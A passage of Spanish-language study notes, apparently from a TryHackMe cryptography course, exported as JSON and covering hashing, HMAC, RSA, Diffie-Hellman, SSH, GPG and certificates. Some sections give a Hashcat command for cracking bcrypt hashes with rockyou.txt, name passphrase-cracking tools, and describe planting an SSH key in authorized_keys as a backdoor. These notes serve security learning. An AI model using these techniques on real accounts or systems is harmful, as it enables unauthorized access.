    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "En esta lección vamos a ver cómo podemos usar las funciones hasheadoras para comprobar la integridad de los archivos.\n\n-----------\n<h2>Comprobación de Integridad</h2>\nEl hashing puede ser usado para comprobar que los archivos no han cambiado. Si pones siempre la misma información de entrada, siempre obtendrás la misma de salida. También es útil para encontrar y eliminar archivos duplicados.\n\n------------\n<h2>HMACs</h2>\nHMAC (Keyed-Hash Message Authentification Code) es un tipo de código de mensaje de autentificación que usa una función hasheadora de criptografía en combinación con una clave secreta para verificar la autenticidad e integridad de los datos.\n\nUn HMAC puede ser usado para asegurarse de que la persona que lo ha creado es quien dice ser. Además prueba que el mensaje original no ha sido modificado o corrompido.\n\nAquí cómo funciona HMAC:\n\n1. La clave secreta es añadida al tamaño de la función hasheadora.\n2. La clave añadida es pasada por un XOR con una constante (usualmente un bloque de 0 y 1).\n3. El mensaje es hasheado usando la función hasheadora con la clave pasada por un XOR.\n4. El resultado del paso 3 se hashea de nuevo con la misma función pero usando la clave añadida pasada por XOR con otra constante.\n5. El resultado final es el valor HMAC.\n\nEn la ilustración se muestra:\n\n![[133.jpg]]\n\nTécnicamente hablando, la función HMAC se calcula de la siguiente manera:\n\n`HMAC(K,M) = H((K ⊕ opad) || H((K ⊕ ipad) || M))`\n\nM y K representan el mensaje y la clave, respectivamente."
  },
  {
    "title": "6. Password Cracking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/3-hashing-basics/6-password-cracking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/3. Hashing Basics/6. Password Cracking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 3. Hashing Basics",
    "content": "ya hemos hablado de cómo las tablas arcoiris nos pueden ayudar si los hashes no usan salt, pero ¿qué pasa si sí que está involucrada?\n\nNo puedes desencriptar hashes porque no están encriptados. Los puedes crackear hasheando múltiples entradas como `rockyou.txt`, añadiendo salt, si hay. Herramientas como [Hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/) son comúnmente utilizadas para este propósito.\n\n-----------------\n<h2>Crackeando Contraseñas con GPUs</h2>\nLas gráficas modernas tienen miles de núcleos. Se especializan en procesamiento de imágenes digitales y aceleración de computación de gráficos. Aunque no pueden hacer el mismo tipo de trabajo que hacen las CPUs, son muy buenas con ciertas operaciones matemáticas, así que puedes usarlas para romper los hashes más rápido, aunque algunos algoritmos como Bcrypt no ofrecen ventajas con respecto a la CPU lo que los ayuda a mantanerse protegidos.\n\n-----------\n<h2>¿Crackeando en Máquinas Virtuales?</h2>\nNormalmente, las máquinas virtuales no tienen acceso a la tarjeta gráfica del dispositivo que las hostea, aunque se puede configurar para ello.\n\nSi quieres usar Hashcat, es mejor usarlo en el host. Si prefieres MS Windows también puedes, desde Powershell.\n\nJohn the Ripper usa CPU por defecto y funciona en una máquina virtual, aunque puedes conseguir mejor rendimiento en el host.\n\n--------------\n<h2>Hora de Crackear algunos Hashes</h2>\nVamos a usar Hashcat para crackear algunos hashes. La sintaxis básica de Hashcat es:\n\n`hashcat -m <tipo_hash> -a <modo_ataque> hashfile wordlist` donde:\n\n- `-m <tipo_hash>`: Especifica el tipo de hash en formato numérico. por ejemplo `-m 1000` es para NTLM. para comprobar el código puedes usar `man hashcat | grep <tipo_hash>`.\n- `-a <modo_ataque>`: Especifica el modo de ataque. Por ejemplo, `-a 0` es para \"directo\" (usar una contraseña de la lista después de otra).\n- `hashfile`: Es el archivo que contiene el hash que quieres crackear.\n- `wordlist`: Es el archivo que contiene la lista de palabras que quieres utilizar.\n\nPor ejemplo, `hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` tratará el hash como Bcrypt e intentará las contraseñas del archivo `rockyou.txt`."
  },
  {
    "title": "8. Conclusion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/8-conclusion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/8. Conclusion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "Hemos definido criptografía. Otra ciencia importante que estudia el bypasseo de la criptografía es el criptoanálisis. Cuando no sabemos nada, el ataque de fuerza bruta puede ser útil, sin embargo en otros escenarios un ataque de diccionario puede funcionar mejor.\n\n- Criptografía: Ciencia que securiza las comunicaciones usando códigos y cifrados.\n- Criptoanálisis: Ciencia que estudia métodos de romper los sistemas criptográficos.\n- Ataque de fuerza bruta: Un método de ataque basado en prueba de todas las combinaciones posibles.\n- Ataque de diccionario: Método en el que el atacante usa palabras de un diccionario o combinaciones de él.\n\n"
  },
  {
    "title": "7. PGP and GPG",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/7-pgp-and-gpg/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/7. PGP and GPG.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "PGP significa Pretty Good Privacy. Es software que implementa la encriptación de archivos, realizar firmas digitales y más. [GnuPG o GPG](https://gnupg.org/) es una implementación de código abierto del estándar OpenPGP.\n\nGPG es comúnmente usado en emails para proteger la confidencialidad de los mensajes. Además pueden ser usados para firmar mensajes de email y confirmar su integridad.\n\nDebajo un ejemplo de generación GPG:\n\n```bash\ngpg --full-gen-key\ngpg (GnuPG) 2.4.4; Copyright (C) 2024 g10 Code GmbH\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\nPlease select what kind of key you want:\n   (1) RSA and RSA\n   (2) DSA and Elgamal\n   (3) DSA (sign only)\n   (4) RSA (sign only)\n   (9) ECC (sign and encrypt) *default*\n  (10) ECC (sign only)\n  (14) Existing key from card\nYour selection? 9\nPlease select which elliptic curve you want:\n   (1) Curve 25519 *default*\n   (4) NIST P-384\n   (6) Brainpool P-256\nYour selection? 1\nPlease specify how long the key should be valid.\n         0 = key does not expire\n      <n>  = key expires in n days\n      <n>w = key expires in n weeks\n      <n>m = key expires in n months\n      <n>y = key expires in n years\nKey is valid for? (0) \nKey does not expire at all\nIs this correct? (y/N) y\n\nGnuPG needs to construct a user ID to identify your key.\n\nReal name: strategos\nEmail address: strategos@tryhackme.thm\n[...]\npub   ed25519 2024-08-29 [SC]\n      AB7E6AA87B6A8E0D159CA7FFE5E63DBD5F83D5ED\nuid                      Strategos <strategos@tryhackme.thm>\nsub   cv25519 2024-08-29 [E]\n```\n\nCon PGP/GPG las claves pueden ser protegidas con passphrase al igual que como se protegen las claves SSH. Para romperlas puedes usar John the Ripper o `gpg2john`.\n\n-------------\n<h2>Ejemplo Práctico</h2>\nAhora que tenemos un par de clave GPG, podemos compartir la clave pública con nuestros contactos. Cuando tus contactos se quieran comunicar contigo de manera segura, encriptarán sus mensajes usando la clave pública. Para desencriptarlos, tú usarás tu clave privada. Es recomendable tener un backup de la clave en algún lugar por si acaso.\n\nDigamos que tienes un ordenador nuevo. Lo único que tienes que hacer es importar tu clave del backup y puedes ponerte manos a la otra otra vez. Para ello:\n\n- Usarás `gpg --import backup.key`.\n- Para desencriptar mensajes: `gpg --decrypt confidential_message.gpg`."
  },
  {
    "title": "5. SSH",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/5-ssh/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/5. SSH.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "La interacción de SSH al iniciar un intento de conexión confirma si el ordenador reconoce la huella de clave pública del servidor. El posible recibir un ataque MITM en esta fase porque no hay manera de saber si esa es la clave pública del servidor al que estamos intentando conectarnos o una conexión interceptada. Si le das a que sí, próximamente te conectará de manera silenciosa al haber guardado ya la clave.\n\n--------------\n<h2>Autentificando un Cliente</h2>\nUna vez que hemos confirmado que estamos hablando con el servidor correcto, necesitamos identificarnos a nosotros mismos y autentificarnos.\n\nUna manera de realizar esta autentificación es con un usuario y contraseña, pero no es de las mejores prácticas. Es aquí donde entra la clave pública y privada que verifican que un usuario es legítimo en el servidor. Por defecto, las claves SSH son RSA aunque puedes elegir qué algoritmo usar para la creación de la clave.\n\n`ssh-keygen` es el comando que se suele utilizar para dicho fin. Algunos de los algoritmos son:\n\n- **DSA (Digital Signature Algorithm):** Algoritmo de criptografía pública diseñado específicamente para firmas digitales.\n- **ECDSA (Elliptic Curve Digital Signature Algorith):** Variante del DSA que usa criptografía de curva elíptica para dar claves más cortas con seguridad equivalente.\n- **ECDSA-SK (ECDSA with Security Key):** Extensión de la ECDSA con claves basadas en hardware para mejorar la seguridad.\n- **Ed25519:** Es un sistema de clave pública que usa EdDSA (Edwards-curve Digital Signature Algorithm) con Curve25519.\n- **Ed25519-SK (Ed25519 with Security Key):** Usa la misma clave basada en hardware que ECDSA-SK pero con Ed25519.\n\nPara generar el par: `ssk-keygen -t ed25519`, por ejemplo.\n\n----------------\n<h2>Claves Privadas SSH</h2>\nComo ya hemos mencionado, debemos tratar las claves privadas como contraseñas. Es muy importante mencionar que la frase de paso (passphrase) nunca se transmite ni deja tu sistema, sólo desencripta la clave SSH.\n\nUsar herramientas como John The Ripper es una manera de atacar estas claves privadas para conseguir la passphrase.\n\nLos permisos deben estar correctamente proporcionados para que el servidor acepte la clave SSH. Si no, la ignorará. Estos permisos en octal son `600`; o lo que es lo mismo,  `rw-------`, o más estrictos.\n\nPara usar la clave para registrarte en un servidor, debes ejecutar: `ssh -i clavePrivada usuario@host`.\n\n<h4>Claves confiadas por el Host Remoto</h4>\nEl fichero `~/.ssh` es el lugar por defecto donde se guardan las claves de OpenSSH. Las `authorized_keys` es el archivo en este directorio que tiene las claves públicas confiadas para acceder al servidor, siempre que el key authentication esté activado.\n\n------------------\n<h2>Usando Claves SSH para obtener una \"Consola Mejor\"</h2>\nDurante CTFs, penetration testing y ejercicios de Red Teaming, las claves SSH son una manera excelente de mejorar una reverse shell, asumiendo que el inicio de sesión de usuarios ha sido activado. Date cuenta que `www-data` normalmente no permite esto pero usuarios normales y root funcionarán. Dejar una llave SSH en el archivo `authorized_keys` de una máquina puede ser una backdoor importante."
  },
  {
    "title": "6. Digital Signatures and Certificates",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/6-digital-signatures-and-certificates/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/6. Digital Signatures and Certificates.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "En el mundo analógico se te pide firmar un papel de vez en cuando. El propósito puede variar dependiendo de la situación. Puede significar que aceptas unos términos, autorizas una transacción o confirmas haber recibido algo. En el mundo digital necesitas una firma digital.\n\n---------------\n<h2>¿Qué es una firma digital?</h2>\nLas firmas digitales ofrecen una manera de verificar la autenticidad e integridad de un mensaje o documento digital. Probar la autenticidad de los archivos significa que sabemos quién ha creado o modificado dicho archivo. Usando encriptación asimétrica, podemos producir una firma con nuestra clave privada, que puede ser verificada usando la clave pública. Sólo tú deberías tener acceso a tu clave privada, lo que significa que tú firmaste ese documento. En los países modernos las firmas analógicas y digitales tienen la misma validez.\n\nLa forma más sencilla de hacer una firma digital es encriptando el documento con tu clave privada. Si alguien quisiera verificar esta firma, desencriptarían el documento usando tu clave pública.\n\n![[132.jpg]]\n\nAlgunos artículos se refieren a firma electrónica y firma digital indistintamente, pero no son lo mismo. Pegar una foto encima de un documento no es una manera real de comprobar autenticidad porque cualquier persona puede hacerlo.\n\nAquí usamos firma digital para referirnos a firmar un documento usando claves privadas o certificados.\n\n-----------\n<h2>Certificados: ¡Prueba quién eres!</h2>\nLos certificados son una aplicación esencial de la criptografía pública y están vinculados a firmas digitales. Un sitio común de su uso es HTTPS. ¿Cómo sabe tu navegador que el servidor con el que estás hablando es realmente tryhackme.com?\n\nLa respuesta recae en los certificados. El servidor tiene un certificado que acredita que es tryhackme.com. Los certificados son sólo confiados si la CA (Certification Authority) lo corrobora. Es una cadena: El certificado está firmado por una organización, la organización es confiada por la CA, la CA es confiada por tu navegador.\n\nDigamos que tenemos una web y queremos usar HTTPS. Necesitaremos un certificado digital TLS. Podemos obtener uno de varias CAs por una cuota anual. Además puedes conseguir tus propios certificados TLS para tus dominios en propiedad usando [Let's Encrypt](https://letsencrypt.org/) de manera gratuita."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "Consideremos el siguiente ejemplo. Vas a reunirte con tu compañero de negocios, tu socio, en una cafetería para discutir detalles relevantes y ciertamente confidenciales. Miremos este ejemplo desde la perspectiva de la seguridad:\n\n- Puedes ver y escuchar a la otra persona físicamente, por lo que puedes identificarlo. Eso es la **autentificación**, confirmar la identidad de con quien estás hablando.\n- También puedes asegurar que lo que oyes sale de su boca, eso es **autenticidad**, confirmar que el mensaje recibido proviene del emisor sabido. Además puedes saber que lo que te dice llega a ti sin cambios, eso es **integridad**.\n- Por último, puedes coger un sitio apartado de otros clientes y hablar en voz baja, de tal forma que sólo os escucháis entre vosotros. Eso es **confidencialidad**.\n\nLa criptografía ofrece soluciones para abordar estos problemas.\n\n-----------\n<h2>Pre-requisitos</h2>\nEsta es la segunda unidad de un grupo de tres sobre la criptografía:\n\n- [[0. Cryptography Basics]]\n- [[0. Public Key Cryptography Basics]]\n- [[0. Hashing Basics]]\n\n---------------\n<h2>Objetivos de Aprendizaje</h2>\nEn esta unidad cubriremos varios sistemas de encriptación asimétricos y las aplicaciones que las usan, como:\n\n- RSA.\n- Diffie-Hellman.\n- SSH.\n- Certificados SSL/TLS.\n- PGP y GPG."
  },
  {
    "title": "4. Diffie-Hellman Key Exchange",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/4-diffie-hellman-key-exchange/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/4. Diffie-Hellman Key Exchange.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "Uno de los retos de usar la encriptación simétrica es compartir la clave secreta. Lo más cómodo para mandarla sería tener un canal de comunicación secreto.\n\n------------\n<h2>Intercambio de Clave Diffie-Hellman</h2>\nEl intercambio de claves tiene como objetivo establecer un secreto compartido entre dos partidos. Es un método que permite que dos partes establezcan un canal de comunicación seguro para compartir secretos sin requerir un secreto compartido previo y sin que un observador pueda obtenerla.\n\nConsideremos el siguiente escenario:\n\nAlice y Bob quieren hablar de forma segura. Quieren establecer una clave para criptografía simétrica pero no quieren usar criptografía asimétrica para el intercambio de clave. Aquí entra en juego Diffie-Hellman.\n\nAlice y Bob generan secretos independientemente, los llamaremos A y B. También tienen algo de material público, lo llamaremos C.\n\nNecesitamos hacer ciertas asunciones:\n\n- Cuando combinamos secretos son prácticamente imposibles de separar.\n- El orden en el que se combinen no importa.\n\nAlice y Bob combinarán sus secretos con material común, AC y BC. Se mandarán eso el uno al otro y lo combinarán con su secreto para crear dos llaves idénticas ABC.\n\nPongamos un ejemplo más explicativo:\n\n1. Alice y Bob se ponen de acuerdo en ciertas variables públicas: un número primo grande *p* y uno generador, *g*; donde *0 < g < p*. Elijamos unos pequeños para el ejemplo: *p = 29* y *g = 3*.\n2. Cada parte elige un número entero privado. Como ejemplo numérico digamos que Alice elije *a = 13* y Bob elige *b = 15*. Cada uno de estos valores representa una clave privada.\n3. Alice calcula su clave: *A = (g^a) % p = 3¹³ % 29 = 19*. Bob calcula la suya: *B = (g^b) % p = 3¹⁵ % 29 = 26*. Estas son claves públicas.\n4. Alice y Bob intercambian las claves. Este proceso se llama intercambio de claves.\n5. Alice y Bob finalmente calculan el secreto compartido usando su  clave privada y pública. Alice calcula: *(B^a) % p = 26¹³ % 29 = 10*; Bob calcula: *(A^b) % p = 19¹⁵ % 29 = 10*. Los dos cálculos conllevan al mismo resultado: g⁽ab⁾ % p = 10, su clave secreta compartida.\n\n![[131.jpg]]\n\nDiffie-Hellman se suele usar junto a RSA para la criptografía pública. Diffie-Hellman se usa para el acuerdo, mientras que RSA para las firmas digitales, transporte de claves y autentificación. RSA ayuda a identificar la persona con la que hablas. De esta manera se previene a alguien atacando la conexión con un MITM pretendiendo ser quien no es."
  },
  {
    "title": "3. RSA",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/3-rsa/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/3. RSA.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "RSA es un algoritmo de cifrado de llave pública que permite mandar información de manera segura a través de canales que no lo son.\n\n----------------\n<h2>Las Matemáticas que Hacen Seguro a RSA</h2>\nRSA está basado en el problema de factorizar un número muy grande. Multiplicar dos números primos grandes es una tarea sencilla. Sin embargo, dado el resultado es muy difícil y costoso encontrar sus factores primos. Consideremos el siguiente ejemplo numérico:\n\n- Número primo 1: 982451653031\n- Número primo 2: 169743212279\n- Su producto: 982451653031 * 169743212279 = 166764499494295486767649\n\nLa multiplicación se hace en un momento, pero intenta buscar los factores primos que lo conforman sin saberlos...\n\nEn la realidad se usan números más grandes, ya que un ordenador puede factorizarlo sencillamente, pero no puede hacerlo con un número de más de 600 dígitos.\n\n-------------\n<h2>Ejemplo Numérico</h2>\nVeamos el algoritmo RSA en acción:\n\n1. Bob elige 2 números primos: *p = 157* y *q = 199*. Calcula *n = p * q = 31243*.\n2. Con la ecuación Phi de Euler: *ϕ(n) = n − p − q + 1* sacamos que el número es 30888. Bob entonces selecciona un número `e` impar, de tal manera que sea coprimo con `ϕ(n)`. Dos números son coprimos si no comparten ningún divisor mayor que 1; 8 y 15 son coprimos pero 14 y 21 no. En este caso *e = 163*. Además selecciona *d* tal que *(e * d) % ϕ(n) = 1*. La **clave pública** es: *(n,e)* y la **clave privada** es: *(n,d)*.\n3. Digamos que el valor que se quiere encriptar es *x = 13*. Alice calcularía y mandaría *y = (x^e) % n*; *y = (13¹⁶³) % 31243 = 16341*.\n4. Bob recibiría este valor y calcularía *x = (y^d) % n*; *x = (16341³⁷⁹) % 31243 = 13*.\n\nVolvemos a recalcar que en ester ejemplo escogimos números primos de tres cifras, pero en la vida real tienen más de 300 dígitos.\n\n--------------\n<h2>RSA en CTFs</h2>\nLa matemática detrás de RSA suele aparecer en los CTF (Capture The Flag). Hay herramientas para romper RSA en CTFs como [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) o [rsatool](https://github.com/ius/rsatool).\n\nNecesitas saber las variables para los CTFs:\n\n- p y q son los números primos grandes.\n- n es el producto de p y q.\n- La clave publica es n y e.\n- La clave privada es n y d.\n- m se usa para representar el mensaje original (plaintext).\n- c representa el mensaje cifrado (ciphertext)."
  },
  {
    "title": "2. Common Use of Asymetric Encryption",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/2-common-use-of-asymetric-encryption/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/2. Common Use of Asymetric Encryption.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "Intercambiar claves de encriptación simétrica usando claves de encriptación asimétrica es una práctica bastante común. La clave asimétrica es más larga y lenta que la simétrica, es por eso que sólo la usamos para decidir una clave simétrica.\n\n------------\n<h2>Analogía</h2>\nImagina que tienes un código secreto y unas instrucciones para usarlo y se lo quieres mandar a tu amigo. Puedes pedirle a tu amigo una caja con candado de la que sólo él tenga la llave. Al llegarle el mensaje a tu amigo puede abrirlo y leer el código y las instrucciones.\n\n| Analogía          | Sistema Criptográfico     |\n| ----------------- | ------------------------- |\n| Códiugo Secreto   | Cifrado simétrico y clave |\n| Cerradura         | Clave pública             |\n| Llave del Candado | Clave privada             |\n\nEs decir, sólo usaremos las claves privada y pública una vez para evitar la lentitud.\n\n---------------\n<h2>El Mundo Real</h2>\nEn la realidad, necesitas más que la criptografía para verificar que la persona con la que estás hablando es realmente quien dice ser. Para ello existen las firmas digitales y los certificados, los cuales veremos en esta unidad."
  },
  {
    "title": "0. Public Key Cryptography Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/2-public-key-cryptography-basics/0-public-key-cryptography-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/0. Public Key Cryptography Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 2. Public Key Cryptography Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/1. Introduction]]\n[[2. Common Use of Asymetric Encryption]]\n[[3. RSA]]\n[[4. Diffie-Hellman Key Exchange]]\n[[THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/5. SSH]]\n[[6. Digital Signatures and Certificates]]\n[[7. PGP and GPG]]\n[[THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/2. Public Key Cryptography Basics/8. Conclusion]]\n"
  },
  {
    "title": "4. Historical Ciphers",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/4-historical-ciphers/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/4. Historical Ciphers.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "La historia de la criptografía es larga y data desde el antigua Egipto sobre el 1900 AC. Uno de los cifrados más simples, sin embargo, es del primer siglo DC. La idea es simple, rotar cada letra un número de posiciones (todas el mismo número).\n\nAquí un ejemplo con `key = 3`:\n\nEncriptación:\n\n![[127.jpg]]\n\nDesencriptación:\n\n![[128.jpg]]\n\n"
  },
  {
    "title": "5. Types of Encryption",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/5-types-of-encryption/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/5. Types of Encryption.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "Hay dos categorías principales de encriptado:\n\n- Simétrica.\n- Asimétrica.\n\n-----------\n<h2>Encriptación Simétrica</h2>\nEsta usa la misma llave para encriptar y desencriptar información. Mantener la llave secreta es un deber. También es llamada criptografía de clave privada. Comunicar la clave a las partes implicadas puede ser retante ya que necesita un canal de comunicación seguro. Mantener el secreto de la clave puede ser difícil, especialmente si hay varios receptores.\n\n![[129.jpg]]\n\nEjemplos de encriptación simétrica son DES (Data Encryption Standard), 3DES (Triple DES) y AES (Advanced Encryption Standard).\n\n- **DES:** Adoptado como estándar en 1977 usa una llave de 56 bits. Con los avances tecnológicos, esta llave fue vulnerada en menos de 24 horas en 1999, transicionando a 3DES.\n- **3DES:** Es aplicar DES tres veces, aumentando el tamaño de la clave hasta 168 bits. Fue deprecada en 2019 y debe ser cambiada por AES.\n- **AES:** Fue adoptada como estándar en 2001. La clave puede ser de 1128, 192 o 256 bits.\n\n-------------\n<h2>Encriptación Asimétrica</h2>\nAl contrario que la encriptación simétrica, la encriptación asimétrica usa claves diferentes para encriptar y desencriptar. Esta usa la llave pública para encriptar y la privada sólo para desencriptar. Se conoce también como criptografía de clave pública.\n\n![[130.jpg]]\n\nAlgunos ejemplos son RSA, Diffie-Hellman y ECC (Eliptic Curve Cryptography). La clave privada necesita ser secreta.\n\nLa criptografía asimétrica tiende a ser más lenta y usan claves más largas que los métodos de criptografía simétrica. RSA usa llaves de 2048, 3072 y 4096 bits.\n\nLa criptografía asimétrica se basa en una seria de problemas matemáticos fáciles de computar en una dirección pero extremadamente difíciles de hacerlo a la inversa.\n\n----------------\n<h2>Resumen y nuevos términos</h2>\n- **Alice y Bob:** Son dos personajes comúnmente usados en ejemplos de criptografía.\n- **Encriptación Simétrica:** Método en el que se usa la misma clave para encriptar y desencriptar.\n- **Encriptación Asimétrica:** Método en el que se usan diferentes claves para encriptar y desencriptar."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "¿Alguna vez te has preguntado cómo evitar que otras personas puedan leer tus mensajes? ¿Cómo puede una app o un navegador construir un canal seguro con un servidor remoto? Gracias a la criptografía.\n\nEsta son los cimientos del mundo digital. Los protocolos y el networking han hecho que todos los dispositivos del mundo se puedan comunicar, pero la criptografía ha sido la que ha conseguido que podamos confiar esa información.\n\nEsta es la primera unidad de un grupo de tres:\n\n- [[0. Cryptography Basics]]\n- [[0. Public Key Cryptography Basics]]\n- [[0. Hashing Basics]]\n\n----------\n<h2>Objetivos de Aprendizaje</h2>\nAprenderemos:\n\n- Términos clave de la criptografía.\n- La importancia de la criptografía.\n- Cifrado César.\n- Cifrados simétricos estándar.\n- Cifrados asimétricos comunes.\n- Matemáticas básicas usadas en criptografía.\n\n"
  },
  {
    "title": "0. Cryptography Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/0-cryptography-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/0. Cryptography Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/1. Introduction]]\n[[2. Importance of Cryptography]]\n[[3. Plaintext to Ciphertext]]\n[[4. Historical Ciphers]]\n[[5. Types of Encryption]]\n[[6. Basic Math]]\n"
  },
  {
    "title": "3. Plaintext to Ciphertext",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/3-plaintext-to-ciphertext/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/3. Plaintext to Ciphertext.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "El método de encriptación es el siguiente:\n\n1. El emisor manda el texto en texto plano (claro), que puede ser texto, una foto, etc.\n2. Se pasa el mensaje en texto plano por una llave.\n3. Se obtiene el mensaje encriptado.\n\n![[125.jpg]]\n\nPara recuperar el mensaje:\n\n1. Se coge el texto cifrado.\n2. Se pasa por la llave de desencriptación.\n3. Se obtiene el mensaje en texto plano.\n\n![[126.jpg]]\n\nTérminos que acabamos de ver:\n\n- **Plaintext:** Es el mensaje original antes de ser encriptado.\n- **Ciphertext:** Es la versión inleíble del mensaje original (encriptado).\n- **Cipher:** Es un algoritmo o método de cifrado y descifrado.\n- **Key:** Es una string de bits que se usa para cifrar y descifrar. Por lo general el cipher es de dominio público, pero la llave debe permanecer secreta.\n- **Encryption:** Es el proceso de convertir el plaintext en ciphertext.\n- **Decryption:** Es el proceso de desconvertir el ciphertext de vuelta en plaintext."
  },
  {
    "title": "2. Importance of Cryptography",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/1-cryptography-basics/2-importance-of-cryptography/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/1. Cryptography Basics/2. Importance of Cryptography.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography > 1. Cryptography Basics",
    "content": "El propósito final de la criptografía es asegurar la comunicación en presencia de adversarios. El término seguro incluye la confidencialidad e integridad de la información intercambiada. La criptografía es la práctica y el estudio de las técnicas que permiten la comunicación segura.\n\nLa criptografía es usada para mantener la confidencialidad, integridad y autenticidad de los datos. En esta época se usa la criptografía a diario.\n\n- Cuando inicias sesión en TryHackMe.\n- Cuando te conectas a una máquina por SSH.\n- Cuando usas el banco online.\n- Cuando te descargas un archivo.\n\nRara vez tenemos que interactuar directamente con la criptografía, pero sus implicaciones nos llegan a todos de una manera u otra. \n\nUna compañía que quiera usar tarjetas de crédito, necesita agarrarse al estándar PCI DSS (Payment Card Industry Data Security Standard). Esta información debe ser encriptada al usarse (obviamente) pero también al almacenarse. Así mismo, una empresa que utilice registros médicos debe atenerse a los estándares propios. Al 